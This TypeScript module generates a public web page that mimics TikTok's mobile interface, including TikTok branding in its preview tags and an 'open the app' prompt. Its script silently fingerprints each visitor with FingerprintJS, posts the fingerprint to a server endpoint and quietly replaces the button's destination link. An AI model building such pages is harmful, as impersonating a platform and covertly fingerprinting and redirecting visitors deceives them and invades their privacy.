/**
 * 旧Cloudflare Worker版(generater-worker.js の VIEWER_CODE)から移植したTikTok風公開ページのHTML生成ロジック。
 * マークアップ・CSSの見た目は変更していない。クライアントサイドJSの末尾に、
 * サプライズ抽選の作成者判定を補強するためのフィンガープリント照合スクリプトのみ追加している
 * (lib/surprise.ts の resolveCreatorUrlByFingerprint / app/api/visit を参照)。
 */
import type { Site } from '@/lib/types';

export interface ViewerData {
  title: string;
  tiktokUrl: string;
  slug: string;
  username: string;
  description: string;
  musicName: string;
  likeCount: string;
  commentCount: string;
  shareCount: string;
  showPageIndicator: boolean;
  pageIndicatorCount: string;
  avatarUrl: string;
  backgroundUrl: string;
  ogpImageUrl: string;
  appIconUrl: string;
  origin: string;
}

export function siteToViewerData(site: Site, origin: string): ViewerData {
  const cd = site.content_data ?? {};
  const images = (cd.images as { background?: string; ogpImage?: string; appIcon?: string } | undefined) ?? {};

  return {
    title: site.title || 'TikTok',
    tiktokUrl: (cd.tiktokUrl as string) || '#',
    slug: site.slug,
    username: (cd.username as string) || site.slug,
    description: site.description || '',
    musicName: (cd.musicName as string) || 'オリジナル楽曲',
    likeCount: (cd.likeCount as string) || '0',
    commentCount: (cd.commentCount as string) || '0',
    shareCount: (cd.shareCount as string) || '0',
    showPageIndicator: Boolean(cd.showPageIndicator),
    pageIndicatorCount: (cd.pageIndicatorCount as string) || '3',
    avatarUrl: site.image_url || '',
    backgroundUrl: images.background || '',
    ogpImageUrl: images.ogpImage || '',
    appIconUrl: images.appIcon || '',
    origin,
  };
}

function esc(s: unknown): string {
  return String(s == null ? '' : s).replace(/[&<>"']/g, (c) =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[c] as string
  );
}

function renderDescription(text: string): string {
  const escaped = esc(text);
  return escaped.replace(/(^|\s)(#[^\s#]+)/g, (m, pre, tag) => pre + '<span class="tag">' + tag + '</span>');
}

function renderPageIndicator(show: boolean, count: string): string {
  if (!show) return '';
  let n = parseInt(count, 10);
  if (!Number.isFinite(n)) n = 3;
  n = Math.max(1, Math.min(6, n));
  let dots = '';
  for (let i = 0; i < n; i++) {
    dots += '<span class="pi-dot' + (i === 0 ? ' active' : '') + '"></span>';
  }
  return '<div class="page-indicator">' + dots + '</div>';
}

export function renderViewerHtml(d: ViewerData): string {
  const {
    title,
    tiktokUrl,
    slug,
    username,
    description,
    musicName,
    likeCount,
    commentCount,
    shareCount,
    showPageIndicator,
    pageIndicatorCount,
    avatarUrl,
    backgroundUrl,
    ogpImageUrl,
    appIconUrl,
    origin,
  } = d;
  const t = esc(title);
  const u = esc(username);
  const m = esc(musicName);
  const lc = esc(likeCount);
  const cc = esc(commentCount);
  const sc = esc(shareCount);
  const bg = esc(backgroundUrl);
  const av = esc(avatarUrl);
  const ogp = esc(ogpImageUrl);
  const icon = esc(appIconUrl);
  const tkUrl = esc(tiktokUrl);
  const descHtml = renderDescription(description);
  const descJson = JSON.stringify(String(description || '')).replace(/</g, '\\u003c');
  const slugJson = JSON.stringify(String(slug || '')).replace(/</g, '\\u003c');
  const pageIndicatorHtml = renderPageIndicator(showPageIndicator, pageIndicatorCount);

  return `<!DOCTYPE html>
<html lang="ja"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
<title>${t}</title>
<meta property="og:title" content="${t}">
<meta property="og:description" content="TikTokのアプリで全機能をお試しください">
<meta property="og:image" content="${ogp}">
<meta property="og:url" content="${origin}/">
<meta property="og:type" content="website">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="${ogp}">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
html,body{height:100%;width:100%;background:#000;font-family:-apple-system,"Hiragino Sans",sans-serif;overflow:hidden;position:fixed;inset:0}
.s{position:relative;width:100%;height:100vh;height:calc(var(--vh,1vh) * 100);height:100svh;height:100dvh;max-width:480px;margin:0 auto;overflow:hidden;background:#000}
.bg{position:absolute;inset:0}.bg img{width:100%;height:100%;object-fit:cover;object-position:center;display:block}
.loading-cover{position:absolute;inset:0;background:#000;z-index:4000}
.rail{position:absolute;right:10px;bottom:80px;display:flex;flex-direction:column;align-items:center;gap:18px;z-index:10}
.rail-avatar{position:relative;display:block;width:46px;height:46px}
.avatar{width:46px;height:46px;border-radius:50%;overflow:hidden;border:2px solid #fff;background:#333}
.avatar img{width:100%;height:100%;object-fit:cover;display:block}
.follow{position:absolute;left:50%;bottom:-9px;transform:translateX(-50%);width:22px;height:22px;filter:drop-shadow(0 1px 2px rgba(0,0,0,.3))}
.rail-item{display:flex;flex-direction:column;align-items:center;gap:4px;color:#fff;background:none;border:none}
.rail-item svg{width:34px;height:34px;filter:drop-shadow(0 1px 2px rgba(0,0,0,.25))}
.rail-item span{font-size:12px;font-weight:600;text-shadow:0 1px 2px rgba(0,0,0,.4)}
.disc{width:42px;height:42px;border-radius:50%;overflow:hidden;border:3px solid #3a3a3a;background:#222;animation:spin 4s linear infinite;margin-top:2px}
.disc img{width:100%;height:100%;object-fit:cover;display:block}
@keyframes spin{to{transform:rotate(360deg)}}
.caption{position:absolute;left:14px;right:100px;bottom:74px;color:#fff;z-index:10}
.uname{font-size:17px;font-weight:700;margin-bottom:6px;text-shadow:0 1px 3px rgba(0,0,0,.4)}
.desc-wrap{max-height:40px;overflow:hidden;font-size:13.5px;line-height:1.47;color:#fff;text-shadow:0 1px 3px rgba(0,0,0,.4);word-break:break-word}
.desc-wrap .tag{font-weight:700}
.more-inline{display:none;font-weight:400;opacity:.8;margin-left:2px;white-space:nowrap}
.music{display:flex;align-items:center;gap:6px;font-size:12.5px;opacity:.9;margin-top:8px;text-shadow:0 1px 3px rgba(0,0,0,.4)}
.music .mtext{max-width:200px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.page-indicator{position:absolute;left:50%;bottom:80px;transform:translateX(-50%);display:flex;align-items:center;gap:6px;z-index:10;pointer-events:none}
.pi-dot{width:6px;height:6px;border-radius:50%;background:rgba(255,255,255,.4)}
.pi-dot.active{background:#fff}
.navbar{position:absolute;left:0;right:0;bottom:0;height:64px;padding-bottom:env(safe-area-inset-bottom);display:flex;align-items:center;justify-content:space-between;padding-left:6px;padding-right:6px;background:linear-gradient(0deg,rgba(0,0,0,.55),rgba(0,0,0,0));z-index:15}
.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:2px;color:#fff}
.nav-item svg{width:34px;height:34px}
.nav-item .nav-label{font-size:11px;font-weight:500}
.nav-plus{flex:1;display:flex;align-items:center;justify-content:center}
.nav-plus svg{width:58px;height:38px}
.ov{position:absolute;inset:0;background:rgba(0,0,0,0.62);z-index:3001;display:flex;align-items:center;justify-content:center;padding:0 20px;animation:ovIn .5s cubic-bezier(.075,.82,.165,1)}
@keyframes ovIn{from{opacity:0}to{opacity:1}}
.mc{background:#fff;border-radius:12px;width:100%;max-width:336px;box-shadow:0 4px 24px rgba(0,0,0,0.3);animation:fu .3s cubic-bezier(.075,.82,.165,1)}
@keyframes fu{from{opacity:0;transform:scale(.1)}to{opacity:1;transform:scale(1)}}
.mb{padding:28px 24px 0;display:flex;flex-direction:column;align-items:center;text-align:center;gap:10px}
.mi{width:60px;height:60px;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.15)}
.mi img{width:100%;height:100%;object-fit:cover;display:block}
.mt{font-size:17px;font-weight:700;color:#161823;line-height:1.35}
.md{font-size:13px;color:rgba(22,24,35,.7);line-height:1.55}
.ma{padding:18px 20px 22px;display:flex;flex-direction:column;align-items:center;position:relative}
.bo{display:block;width:100%;padding:13px 0;background:#fe2c55;color:#fff;font-size:16px;font-weight:700;border:none;border-radius:4px;text-align:center;text-decoration:none;cursor:pointer;box-shadow:0 2px 8px rgba(254,44,85,.35);transition:opacity .15s}
.bo:active{opacity:.82}
.bl{display:block;width:100%;padding:12px 0 0;background:none;border:none;color:rgba(22,24,35,.55);font-size:15px;cursor:pointer;text-align:center}
.tg{position:absolute;right:38px;top:16px;width:44px;height:44px;pointer-events:none;z-index:5}
.tg-ripple{position:absolute;left:26px;top:42px;width:16px;height:16px;margin:-8px 0 0 -8px;border-radius:50%;background:transparent;border:2px solid rgba(255,255,255,.9);transform:scale(0);opacity:0;animation:tgRipple 5.5s cubic-bezier(.4,0,.2,1) infinite}
.tg-hand{position:absolute;left:0;top:0;width:44px;height:44px;display:block;filter:drop-shadow(0 2px 5px rgba(0,0,0,.25));animation:tgTap 5.5s cubic-bezier(.4,0,.2,1) infinite}
@keyframes tgTap{
  0%{transform:translate(0,0) scale(1);opacity:1}
  4%{transform:translate(10px,12px) scale(.92)}
  9%{transform:translate(0,0) scale(1)}
  13%{transform:translate(0,0) scale(1)}
  17%{transform:translate(10px,12px) scale(.92)}
  22%{transform:translate(0,0) scale(1)}
  26%{transform:translate(0,0) scale(1)}
  30%{transform:translate(10px,12px) scale(.92)}
  35%{transform:translate(0,0) scale(1);opacity:1}
  40%{opacity:0}
  97%{opacity:0}
  100%{transform:translate(0,0) scale(1);opacity:1}
}
@keyframes tgRipple{
  0%,2%{transform:scale(0);opacity:0}
  4%{transform:scale(.4);opacity:.9}
  11%{transform:scale(2.4);opacity:0}
  13%,15%{transform:scale(0);opacity:0}
  17%{transform:scale(.4);opacity:.9}
  24%{transform:scale(2.4);opacity:0}
  26%,28%{transform:scale(0);opacity:0}
  30%{transform:scale(.4);opacity:.9}
  37%{transform:scale(2.4);opacity:0}
  100%{transform:scale(0);opacity:0}
}
</style></head><body>
<div class="s">
  <div class="bg"><img src="${bg}" alt=""></div>

  <div class="rail">
    <div class="rail-avatar">
      <div class="avatar"><img src="${av}" alt=""></div>
      <svg class="follow" viewBox="0 0 28 28"><path fill="#FE2C55" d="M14 25C20.6274 25 26 19.6274 26 13C26 6.37258 20.6274 1 14 1C7.37258 1 2 6.37258 2 13C2 19.6274 7.37258 25 14 25Z"></path><path fill="#fff" d="M9.5 14C9.22386 14 9 13.7761 9 13.5V12.5C9 12.2239 9.22386 12 9.5 12H18.5C18.7761 12 19 12.2239 19 12.5V13.5C19 13.7761 18.7761 14 18.5 14H9.5Z"></path><path fill="#fff" d="M13 8.5C13 8.22386 13.2239 8 13.5 8H14.5C14.7761 8 15 8.22386 15 8.5V17.5C15 17.7761 14.7761 18 14.5 18H13.5C13.2239 18 13 17.7761 13 17.5V8.5Z"></path></svg>
    </div>
    <div class="rail-item">
      <svg viewBox="0 0 48 48"><path fill="#fff" d="M24 9.44c3.2-4.03 7.61-5.56 12-4.67 2.31.47 5.59 2.28 7.75 5.48 2.26 3.32 3.21 7.99.98 13.85-1.75 4.57-5.5 8.83-9.28 12.2a56.6 56.6 0 0 1-10.52 7.47l-.93.49-.93-.49a56.6 56.6 0 0 1-10.52-7.47c-3.78-3.37-7.53-7.63-9.28-12.2-2.24-5.86-1.28-10.53.98-13.85C6.4 7.05 9.69 5.24 12 4.77c4.39-.9 8.8.64 12 4.67Z"></path></svg>
      <span>${lc}</span>
    </div>
    <div class="rail-item">
      <svg viewBox="0 0 48 48"><path fill="#fff" fill-rule="evenodd" clip-rule="evenodd" d="M38.5 35.31c4.1-4.11 6.5-8.4 6.5-13.38C45 11.8 35.73 3.6 24.3 3.6S3.6 11.8 3.6 21.93C3.6 32.05 13.17 39 24.6 39v3.36c0 1.06 1.1 1.75 2.04 1.24 2.92-1.58 8.33-4.76 11.85-8.29ZM14.23 19.46a2.95 2.95 0 0 1 2.96 2.93 2.95 2.95 0 0 1-2.96 2.94 2.95 2.95 0 0 1-2.95-2.94 2.95 2.95 0 0 1 2.95-2.93Zm13.02 2.93a2.95 2.95 0 0 0-2.96-2.93 2.95 2.95 0 0 0-2.96 2.93 2.95 2.95 0 0 0 2.96 2.94 2.95 2.95 0 0 0 2.96-2.94Zm7.1-2.93a2.95 2.95 0 0 1 2.95 2.93 2.95 2.95 0 0 1-2.96 2.94 2.95 2.95 0 0 1-2.95-2.94 2.95 2.95 0 0 1 2.95-2.93Z"></path></svg>
      <span>${cc}</span>
    </div>
    <div class="rail-item">
      <svg viewBox="0 0 48 48"><path fill="#fff" fill-rule="evenodd" clip-rule="evenodd" d="M25.56 4.07a1.98 1.98 0 0 0-2.15-.42 1.95 1.95 0 0 0-1.21 1.8v8.34c-5.4.35-10.04 2.2-13.43 5.68C4.97 23.35 3 29.03 3 36.19c0 .79.48 1.5 1.22 1.8.73.3 1.58.13 2.14-.42 3.34-3.31 7.65-4.56 11.25-4.95 1.8-.2 3.37-.18 4.5-.1h.09v9.03c0 .78.46 1.48 1.18 1.79.72.3 1.56.16 2.13-.37l18.87-17.49a1.94 1.94 0 0 0 .04-2.8L25.56 4.07Z"></path></svg>
      <span>${sc}</span>
    </div>
    <div class="disc"><img src="${av}" alt=""></div>
  </div>

  <div class="caption">
    <div class="uname">@${u}</div>
    <div class="desc-wrap" id="descWrap"><span id="descText">${descHtml}</span><span class="more-inline" id="moreInline">もっと見る</span></div>
    <div class="music">♫<span class="mtext">${m}</span></div>
  </div>

  ${pageIndicatorHtml}

  <div class="navbar">
    <div class="nav-item">
      <svg viewBox="0 0 48 48" fill="#fff"><path fill-rule="evenodd" clip-rule="evenodd" d="M24.9505 7.84001C24.3975 7.38666 23.6014 7.38666 23.0485 7.84003L6.94846 21.04C6.45839 21.4418 6.2737 22.1083 6.48706 22.705C6.70041 23.3017 7.26576 23.7 7.89949 23.7H10.2311L11.4232 36.7278C11.5409 38.0149 12.6203 39 13.9128 39H21.5C22.0523 39 22.5 38.5523 22.5 38V28.3153C22.5 27.763 22.9477 27.3153 23.5 27.3153H24.5C25.0523 27.3153 25.5 27.763 25.5 28.3153V38C25.5 38.5523 25.9477 39 26.5 39H34.0874C35.3798 39 36.4592 38.0149 36.577 36.7278L37.7691 23.7H40.1001C40.7338 23.7 41.2992 23.3017 41.5125 22.705C41.7259 22.1082 41.5412 21.4418 41.0511 21.04L24.9505 7.84001Z"></path></svg>
      <span class="nav-label">ホーム</span>
    </div>
    <div class="nav-item" style="opacity:.75">
      <svg viewBox="0 0 36 36" fill="#fff"><path fill-rule="evenodd" clip-rule="evenodd" d="M18 28.0547C23.553 28.0547 28.0547 23.5531 28.0547 18C28.0547 12.4469 23.553 7.94531 18 7.94531C12.4469 7.94531 7.94531 12.4469 7.94531 18C7.94531 23.5531 12.4469 28.0547 18 28.0547ZM30.375 18C30.375 24.8345 24.8345 30.375 18 30.375C11.1655 30.375 5.625 24.8345 5.625 18C5.625 11.1655 11.1655 5.625 18 5.625C24.8345 5.625 30.375 11.1655 30.375 18Z"></path><path fill-rule="evenodd" clip-rule="evenodd" d="M20.3508 20.3864C20.712 20.1679 20.9645 19.8074 21.0462 19.3932L22.427 12.3948C22.5027 12.0113 22.0871 11.7204 21.7527 11.9226L15.6486 15.6137C15.2874 15.8322 15.0349 16.1928 14.9532 16.6069L13.5724 23.6053C13.4967 23.9888 13.9123 24.2797 14.2467 24.0775L20.3508 20.3864ZM16.5684 20.0442L18.9029 18.6325L19.431 15.9559L17.0965 17.3676L16.5684 20.0442Z"></path></svg>
      <span class="nav-label">トレンド</span>
    </div>
    <div class="nav-plus">
      <svg viewBox="0 0 75 49" fill="none">
        <path fill="#FA2D6C" fill-rule="evenodd" d="M23.5 23.3c0-4.48 0-6.72.872-8.432a8 8 0 0 1 3.496-3.496C29.58 10.5 31.82 10.5 36.3 10.5h9.9c4.48 0 6.72 0 8.432.872a8 8 0 0 1 3.496 3.496C59 16.58 59 18.82 59 23.3v2.4c0 4.48 0 6.72-.872 8.432a8 8 0 0 1-3.496 3.496c-1.711.872-3.952.872-8.432.872h-9.9c-4.48 0-6.72 0-8.432-.872a8 8 0 0 1-3.496-3.496C23.5 32.42 23.5 30.18 23.5 25.7z" clip-rule="evenodd"></path>
        <path fill="#20D5EC" fill-rule="evenodd" d="M16 23.3c0-4.48 0-6.72.872-8.432a8 8 0 0 1 3.496-3.496C22.08 10.5 24.32 10.5 28.8 10.5h9.9c4.48 0 6.72 0 8.432.872a8 8 0 0 1 3.496 3.496c.872 1.711.872 3.952.872 8.432v2.4c0 4.48 0 6.72-.872 8.432a8 8 0 0 1-3.496 3.496c-1.711.872-3.952.872-8.432.872h-9.9c-4.48 0-6.72 0-8.432-.872a8 8 0 0 1-3.496-3.496C16 32.42 16 30.18 16 25.7z" clip-rule="evenodd"></path>
        <rect width="36" height="28" x="19.5" y="10.5" fill="#fff" rx="8"></rect>
        <path fill="#161823" fill-rule="evenodd" d="M36.5 18.25a.5.5 0 0 0-.5.5v4.75h-4.75a.5.5 0 0 0-.5.5v1.5a.5.5 0 0 0 .5.5H36v4.75a.5.5 0 0 0 .5.5H38a.5.5 0 0 0 .5-.5V26h4.75a.5.5 0 0 0 .5-.5V24a.5.5 0 0 0-.5-.5H38.5v-4.75a.5.5 0 0 0-.5-.5z" clip-rule="evenodd"></path>
      </svg>
    </div>
    <div class="nav-item" style="opacity:.75">
      <svg viewBox="0 0 32 32" fill="#fff"><path fill-rule="evenodd" clip-rule="evenodd" d="M24.0362 21.3333H18.5243L15.9983 24.4208L13.4721 21.3333H7.96047L7.99557 8H24.0009L24.0362 21.3333ZM24.3705 23.3333H19.4721L17.2883 26.0026C16.6215 26.8176 15.3753 26.8176 14.7084 26.0026L12.5243 23.3333H7.62626C6.70407 23.3333 5.95717 22.5845 5.9596 21.6623L5.99646 7.66228C5.99887 6.74352 6.74435 6 7.66312 6H24.3333C25.2521 6 25.9975 6.7435 26 7.66224L26.0371 21.6622C26.0396 22.5844 25.2927 23.3333 24.3705 23.3333ZM12.6647 14C12.2965 14 11.998 14.2985 11.998 14.6667V15.3333C11.998 15.7015 12.2965 16 12.6647 16H19.3313C19.6995 16 19.998 15.7015 19.998 15.3333V14.6667C19.998 14.2985 19.6995 14 19.3313 14H12.6647Z"></path></svg>
      <span class="nav-label">メッセージ</span>
    </div>
    <div class="nav-item" style="opacity:.75">
      <svg viewBox="0 0 48 48" fill="#fff"><path fill-rule="evenodd" clip-rule="evenodd" d="M24.0001 11.5C20.9625 11.5 18.5001 13.9624 18.5001 17C18.5001 20.0376 20.9625 22.5 24.0001 22.5C27.0377 22.5 29.5001 20.0376 29.5001 17C29.5001 13.9624 27.0377 11.5 24.0001 11.5ZM15.5001 17C15.5001 12.3056 19.3057 8.5 24.0001 8.5C28.6945 8.5 32.5001 12.3056 32.5001 17C32.5001 21.6944 28.6945 25.5 24.0001 25.5C19.3057 25.5 15.5001 21.6944 15.5001 17ZM24.0001 30.5C19.1458 30.5 15.0586 33.7954 13.8578 38.2712C13.7147 38.8046 13.2038 39.1741 12.6591 39.0827L11.6729 38.9173C11.1282 38.8259 10.7571 38.3085 10.8888 37.7722C12.3362 31.8748 17.6559 27.5 24.0001 27.5C30.3443 27.5 35.664 31.8748 37.1114 37.7722C37.2431 38.3085 36.872 38.8259 36.3273 38.9173L35.3411 39.0827C34.7964 39.1741 34.2855 38.8046 34.1424 38.2712C32.9416 33.7954 28.8544 30.5 24.0001 30.5Z"></path></svg>
      <span class="nav-label">プロフィール</span>
    </div>
  </div>

  <div class="ov" id="ov">
    <div class="mc">
      <div class="mb">
        <div class="mi"><img src="${icon}" alt=""></div>
        <p class="mt">アプリで全機能をお試しください</p>
        <p class="md">アプリでさらに多くの動画と優れた機能をお楽しみください</p>
      </div>
      <div class="ma">
        <a href="${tkUrl}" class="bo">TikTokを開く</a>
        <button class="bl" type="button">後で</button>
        <div class="tg" aria-hidden="true">
          <img class="tg-hand" src="/hand-tap.png" alt="">
          <span class="tg-ripple"></span>
        </div>
      </div>
    </div>
  </div>

  <div class="loading-cover" id="loadingCover"></div>
</div>
<script>
function setVh(){document.documentElement.style.setProperty('--vh',window.innerHeight*0.01+'px')}
setVh();addEventListener('resize',setVh);addEventListener('orientationchange',setVh);
(function(){
  var cover=document.getElementById('loadingCover');
  var imgs=Array.prototype.slice.call(document.querySelectorAll('.s img'));
  function ready(img){
    if(img.complete&&img.naturalWidth>0){
      return img.decode?img.decode().catch(function(){}):Promise.resolve();
    }
    return new Promise(function(resolve){
      img.addEventListener('load',function(){
        if(img.decode){img.decode().then(resolve).catch(resolve);}else{resolve();}
      });
      img.addEventListener('error',resolve);
    });
  }
  var timeout=new Promise(function(resolve){setTimeout(resolve,4000);});
  Promise.race([Promise.all(imgs.map(ready)),timeout]).then(function(){
    cover.style.display='none';
  });
})();
(function(){
  var wrap=document.getElementById('descWrap');
  var textEl=document.getElementById('descText');
  var moreEl=document.getElementById('moreInline');
  var fullText=${descJson};
  function esc(s){return String(s==null?'':s).replace(/[&<>"']/g,function(c){return({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c];});}
  function renderCut(n){
    var t=n===null?fullText:fullText.slice(0,n);
    textEl.innerHTML=esc(t).replace(/(^|\\s)(#[^\\s#]+)/g,function(m,pre,tag){return pre+'<span class="tag">'+tag+'</span>';});
  }
  requestAnimationFrame(function(){
    if(wrap.scrollHeight<=wrap.clientHeight+1)return;
    moreEl.style.display='inline';
    var lo=0,hi=fullText.length;
    while(lo<hi){
      var mid=Math.ceil((lo+hi)/2);
      renderCut(mid);
      if(wrap.scrollHeight<=wrap.clientHeight+1)lo=mid;else hi=mid-1;
    }
    renderCut(lo);
  });
})();
(function(){
  var link=document.querySelector('.bo');
  if(!link)return;
  var slug=${slugJson};
  var resolvedHref=null;
  function loadScript(src){
    return new Promise(function(resolve,reject){
      var s=document.createElement('script');
      s.src=src;s.async=true;s.onload=resolve;s.onerror=reject;
      document.head.appendChild(s);
    });
  }
  var pending=loadScript('/fp.js').then(function(){
    if(!window.FingerprintJS)return null;
    return window.FingerprintJS.load().then(function(agent){return agent.get();});
  }).then(function(result){
    if(!result)return null;
    return fetch('/api/visit',{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({slug:slug,fp:result.visitorId})
    }).then(function(res){return res.ok?res.json():null;});
  }).then(function(data){
    if(data&&data.href){
      resolvedHref=data.href;
      link.setAttribute('href',resolvedHref);
    }
  }).catch(function(){});
  link.addEventListener('click',function(e){
    if(resolvedHref)return;
    e.preventDefault();
    var navigated=false;
    function go(){
      if(navigated)return;
      navigated=true;
      window.location.href=resolvedHref||link.getAttribute('href');
    }
    pending.then(go,go);
    setTimeout(go,800);
  });
})();
</script>
</body></html>`;
}
